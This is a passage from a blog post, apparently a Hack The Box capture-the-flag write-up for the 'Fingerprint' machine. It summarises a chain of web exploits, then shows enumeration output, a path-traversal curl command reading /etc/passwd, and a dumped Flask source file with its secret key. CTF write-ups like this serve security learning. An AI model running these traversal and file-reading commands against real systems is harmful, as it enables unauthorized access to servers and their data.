<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Fingerprint just retired on Hack The Box. It’s an ‘Insane’ difficulty Linux box.As usual it was a really well designed box which required a ton of enumeration and going back and forth through all th">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Fingerprint">
<meta property="og:url" content="https://hg8.sh/posts/fingerprint/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="Fingerprint just retired on Hack The Box. It’s an ‘Insane’ difficulty Linux box.As usual it was a really well designed box which required a ton of enumeration and going back and forth through all th">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/164230078-c1ddd0ba-54e1-4b8c-812f-43000d0b9cb9.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/163688997-7d268b7c-07a4-450d-bc5a-abfc9de98fc5.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/163689139-f8eccb2f-2169-457e-a6d8-e666a385fc68.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/163689525-da0d789c-4a6e-4e43-80a2-55f3d5cb8cd2.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/163690088-f1798f94-a65b-4cae-87fe-c2225bd9b719.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/163710365-7515ee7f-f3fd-4dd8-afc3-4d8d4496196d.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/163689606-e3c205dd-be3d-479e-92b8-658f5b71d095.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/163711238-ccb7eb49-75ed-4bc9-8c9c-11b45833335f.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/163713586-c0015a06-3f13-41cb-a726-57670cd7b86d.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/163730221-3b859aa4-7448-4a39-b7fa-26169416626c.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/163730383-9cd288ba-5d3a-4057-a79c-a573d8a707bc.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/164198016-31a1ff7c-bd60-4c8c-8f03-8dedbe49c27e.gif">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/164252769-66526746-ec42-4118-b50d-6b5c3dd08b04.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/164254008-7bde149a-bd72-4bf5-8e4e-ac08cc097458.png">
<meta property="article:published_time" content="2022-05-13T22:00:00.000Z">
<meta property="article:modified_time" content="2022-08-04T08:37:52.828Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="LFI">
<meta property="article:tag" content="JWT">
<meta property="article:tag" content="Cookie Forge">
<meta property="article:tag" content="Crypto">
<meta property="article:tag" content="ECB">
<meta property="article:tag" content="Command Injection">
<meta property="article:tag" content="HQL Injection">
<meta property="article:tag" content="Bruteforce">
<meta property="article:tag" content="XSS">
<meta property="article:tag" content="Reverse Shell">
<meta property="article:tag" content="Flask">
<meta property="article:tag" content="SUID">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/164230078-c1ddd0ba-54e1-4b8c-812f-43000d0b9cb9.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - Fingerprint :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/admirertoo/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/misc-ctf/request-smuggling/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-File-Inclusion"><span class="toc-number">1.2.</span> <span class="toc-text">Local File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#users-db-database"><span class="toc-number">1.3.</span> <span class="toc-text">users.db database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-on-auth-log"><span class="toc-number">1.4.</span> <span class="toc-text">XSS on auth.log</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HQL-Injection"><span class="toc-number">1.5.</span> <span class="toc-text">HQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Authentication-Bypass"><span class="toc-number">1.6.</span> <span class="toc-text">Authentication Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Backups"><span class="toc-number">1.7.</span> <span class="toc-text">Backups</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Admin-cookie-forging"><span class="toc-number">1.8.</span> <span class="toc-text">Admin cookie forging</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection-to-Remote-Code-Execution"><span class="toc-number">1.9.</span> <span class="toc-text">Command Injection to Remote Code Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-%E2%86%92john"><span class="toc-number">1.10.</span> <span class="toc-text">Pivot www-data →john</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ECB-Attack"><span class="toc-number">2.2.</span> <span class="toc-text">ECB Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Determining-ECB-Block-Size"><span class="toc-number">2.3.</span> <span class="toc-text">Determining ECB Block Size</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ECB-Attack-1"><span class="toc-number">2.4.</span> <span class="toc-text">ECB Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie-forging-part-2"><span class="toc-number">2.5.</span> <span class="toc-text">Cookie forging - part 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI-as-root"><span class="toc-number">2.6.</span> <span class="toc-text">LFI as root</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.</span> <span class="toc-text">References</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Fingerprint
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2022-05-13T22:00:00.000Z" itemprop="datePublished">14-05-2022</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      37 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="578" alt="figerprint-hackthebox" src="https://user-images.githubusercontent.com/9076747/164230078-c1ddd0ba-54e1-4b8c-812f-43000d0b9cb9.png">

<p>Fingerprint just retired on Hack The Box. It’s an ‘Insane’ difficulty Linux box.<br>As usual it was a really well designed box which required a ton of enumeration and going back and forth through all the findings. I had to make a mind-map to keep track of all the interesting findings and each could be linked together. The box doesn’t rely on common vulnerabilities but rather on little configuration and coding errors that allow you to chain vulnerabilities until you can obtain what you need. In the end it’s a tough but awesome box that allowed me to learn new techniques I was unfamiliar with before. Highly recommended.</p>
<p><strong>Tl;Dr:</strong> To get the user flag you first had to exploit a Local File Inclusion (LFI) vulnerability in the main app in order to retrieve its source code and database. You can then retrieve working credentials from the database to access the app. Once authenticated you can exploit an XSS to retrieve the user fingerprint which, linked to an HQL Injection allows to completely bypass the authentication in the second app. While connected you can then see a JSON Web Token (JWT) set as a cookie, decoding it return serialized information of the connected user including their Admin status. With more recon you can find some source code of the app, allowing you to retrieve the secret used to sign as well as the serialization logic. Using this information we can forge a new valid token to authenticate as admin. Being Admin unlocks a new feature, which, after reading through the source code, is vulnerable to blind command injection in the cookie decoding process; knowing this we can forge a cookie containing a reserve shell and get our initial access as <code>www-data</code> user. Once in the box we find a SUID binary belonging to <code>john</code> with basic <code>grep</code> functionalities. Since the binary belongs to <code>john</code> it can access it’s SSH private key, and searching character after character we can brute-force the whole key, connect as <code>john</code> and grab the user flag.</p>
<p>For the root flag you can find the source code of an improved version of the main application, running on port 8088. The source code shows the implementation of a new cookie logic using AES-ECB encryption. Knowing the weakness of the ECB algorithm we can launch a brute-force attack on the cookie generation logic in order to retrieve the secret used to create cookies. Once we have the secret we can easily forge a cookie for the admin user, exploiting a flaw in the admin cookie verification. Once authenticated as <code>admin</code>, we can exploit the initial LFI vulnerability we found at the beginning to access <code>root</code> account SSH private key and grab the flag.</p>
<p>Alright! Let’s get into the details now!</p>
<hr>
<p>First thing first, let’s add the box IP to the hosts file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.129.118.212 fingerprint.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>And let’s start!</p>
<h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC fingerprint.htb</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-16 15:48 UTC</span><br><span class="line">Nmap scan report <span class="keyword">for</span> fingerprint.htb (10.129.118.212)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 997 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 90:65:07:35:be:8d:7b:ee:ff:3a:11:96:06:a9:a1:b9 (RSA)</span><br><span class="line">|   256 4c:5b:74:d9:3c:c0:60:24:e4:95:2f:b0:51:84:03:c5 (ECDSA)</span><br><span class="line">|_  256 82:f5:b0:d9:73:18:01:47:61:f7:f6:26:0a:d5:<span class="built_in">cd</span>:f2 (ED25519)</span><br><span class="line">80/tcp   open  http    Werkzeug httpd 1.0.1 (Python 2.7.17)</span><br><span class="line">|_http-server-header: Werkzeug/1.0.1 Python/2.7.17</span><br><span class="line">|_http-title: mylog - Starting page</span><br><span class="line">8080/tcp open  http    Sun GlassFish Open Source Edition  5.0.1</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: PUT DELETE TRACE</span><br><span class="line">|_http-server-header: GlassFish Server Open Source Edition  5.0.1</span><br><span class="line">|_http-title: secAUTH</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 54.68 seconds</span><br></pre></td></tr></table></figure>

<p>On top of the usual SSH port, we can see two web ports open <code>80</code> and <code>8080</code>, which are respectively a Python Web App and a Sun Glassfish Server.</p>
<p>Once opened, we notice that both websites are simple landing pages and require authentication to use all the functionalities. </p>
<p>On one hand the main server, <code>gobuster</code> doesn’t allow us to find anything interesting and on the other hand the GlassFish server returns a few available endpoints:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://fingerprint.htb:8080/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://fingerprint.htb:8080/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /home/vagrant/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/04/16 16:18:38 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/META-INF             (Status: 301) [Size: 187] [--&gt; http://fingerprint.htb:8080/META-INF/]</span><br><span class="line">/WEB-INF              (Status: 301) [Size: 186] [--&gt; http://fingerprint.htb:8080/WEB-INF/]</span><br><span class="line">/backups              (Status: 301) [Size: 186] [--&gt; http://fingerprint.htb:8080/backups/]</span><br><span class="line">/j_security_check     (Status: 401) [Size: 1094]</span><br><span class="line">/login                (Status: 200) [Size: 1733]</span><br><span class="line">/resources            (Status: 301) [Size: 188] [--&gt; http://fingerprint.htb:8080/resources/]</span><br><span class="line">/upload               (Status: 405) [Size: 1184]</span><br><span class="line">/welcome              (Status: 302) [Size: 183] [--&gt; http://fingerprint.htb:8080/login</span><br></pre></td></tr></table></figure>

<p>Unfortunately they all return <code>404</code>, we probably need to be logged to access the resources.</p>
<p>Let’s try to focus on the main website to enumerate as much as possible and find useful output.</p>
<p>After trying <a target="_blank" rel="noopener" href="https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#clusterbomb">Clusterbomb</a> mode with <code>ffuf</code> we can find two new endpoints, <code>/admin/view</code> and <code>/admin/delete</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ffuf -u http://fingerprint.htb/admin/FUZZ/FUZZ -mode clusterbomb -w common.txt -w common.txt</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.4.1</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://fingerprint.htb/admin/FUZZ/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: common.txt</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: common.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">delete                  [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 45ms]</span></span><br><span class="line"><span class="string">view                    [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 51ms]</span></span><br></pre></td></tr></table></figure>

<h3 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h3><p>After digging around for a <em>very</em> long time and trying the most common exploit on both of these endpoints we finally a get positive result! </p>
<p>A Local File Inclusion (LFI) vulnerability in <code>/admin/view</code>/:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --path-as-is <span class="string">&quot;http://fingerprint.htb/admin/view/../../../../../../../../../../../../../../../../etc/passwd&quot;</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">[...]</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">john:x:1000:1000:john:/home/john:/bin/bash</span><br><span class="line">mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">flask:x:1001:1001::/home/flask:/bin/sh%</span><br></pre></td></tr></table></figure>

<p>We can see we have two users, <code>john</code> and <code>flask</code>. </p>
<p>We know from HTTP request that the server is Werkzeug, a Python Web Server Gateway Interface (WSGI) library. So it does make sense that the web application is running the very common Python web framework Flask.</p>
<p>After a bit of directory brute-force on the server (knowing the common app name format used in Flask project) we manage to retrieve the <code>app.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --path-<span class="keyword">as</span>-<span class="keyword">is</span> <span class="string">&quot;http://fingerprint.htb/admin/view/../../../../../../../../../../../../../../../../home/flask/app/app.py&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, request, render_template, session, g, url_for, send_file, make_response</span><br><span class="line"><span class="keyword">from</span> .auth <span class="keyword">import</span> check</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> isfile, join</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">LOG_PATH = <span class="string">&quot;/data/logs/&quot;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;SjG$g5VZ(vHC;M2Xc/2~z(&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_user</span>():</span></span><br><span class="line">uid = session.get(<span class="string">&quot;user_id&quot;</span>)</span><br><span class="line">g.uid = uid</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">user = do_auth()</span><br><span class="line"><span class="keyword">if</span> user:</span><br><span class="line">session[<span class="string">&quot;user_id&quot;</span>] = user[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&quot;admin&quot;</span>), code=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> show_login()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter_logs</span>(<span class="params">ip, logs</span>):</span></span><br><span class="line"><span class="keyword">if</span> ip.startswith(<span class="string">&#x27;127.0.&#x27;</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join(logs)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join(filtered_logs)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line"><span class="comment">#log_files = [(f, os.path.getsize(join(LOG_PATH, f))) for f in listdir(LOG_PATH) if isfile(join(LOG_PATH, f))]</span></span><br><span class="line">log_names = [f <span class="keyword">for</span> f <span class="keyword">in</span> listdir(LOG_PATH) <span class="keyword">if</span> isfile(join(LOG_PATH, f))]</span><br><span class="line">log_files = []</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> log_names:</span><br><span class="line">f = <span class="built_in">open</span>(join(LOG_PATH, name), <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">log_files.append((name, <span class="built_in">len</span>(filter_logs(request.remote_addr, data))))</span><br><span class="line"></span><br><span class="line">site_content=render_template(<span class="string">&#x27;admin.html&#x27;</span>, log_files=log_files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.uid <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> g.uid:</span><br><span class="line">resp = make_response(site_content, <span class="number">302</span>)</span><br><span class="line">resp.headers[<span class="string">&#x27;Location&#x27;</span>] = <span class="string">&#x27;/login&#x27;</span></span><br><span class="line"><span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> site_content</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/view/&lt;path:log_path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logs_view</span>(<span class="params">log_path</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">path = LOG_PATH + log_path</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">data = file.readlines()</span><br><span class="line"><span class="keyword">return</span> filter_logs(request.remote_addr, data)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;No such log found!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/delete/&lt;path:log_path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logs_delete</span>(<span class="params">log_path</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">path = LOG_PATH + log_path</span><br><span class="line">os.remove(path)</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&quot;admin&quot;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;No such log found!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_auth</span>():</span></span><br><span class="line">user = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> check(user, password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_login</span>():</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span 